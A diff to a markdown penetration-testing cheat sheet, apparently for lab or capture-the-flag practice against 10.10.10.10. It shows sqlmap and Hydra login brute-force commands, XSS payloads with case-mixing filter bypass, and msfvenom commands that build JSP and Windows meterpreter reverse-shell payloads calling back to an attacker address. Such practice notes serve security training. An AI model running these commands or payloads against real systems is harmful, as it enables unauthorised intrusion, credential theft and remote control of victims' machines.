@@ -100,13 +100,13 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D d
 ## MYSQL
 
 **Remotely**
-
+```sh
 mysql -u <user> -p<password> -h <IP> -D <dbname>
-
+```
 **Locally**
-
+```sh
 mysql -u <user> -p<password>
-
+```
 
 ## Hydra
 **SSH & FTP Login Bruteforcing**
@@ -128,7 +128,7 @@ hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^
 ```sh
 \<script\>alert(1)\</script\>
 \<ScRiPt\>alert(1)\</ScRiPt\>
-\<script\>alert('XSS')\</script\>\
+\<script\>alert('XSS')\</script\>
 \<ScRiPt\>alert('XSS')\</ScRiPt\>
 ```
 *This is a great filter bypass cheatsheet*\
@@ -143,9 +143,9 @@ https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 ```sh
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
 ```
-**WAR**
+**EXE**
 ```sh
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 ```
 **PHP**
 ```sh
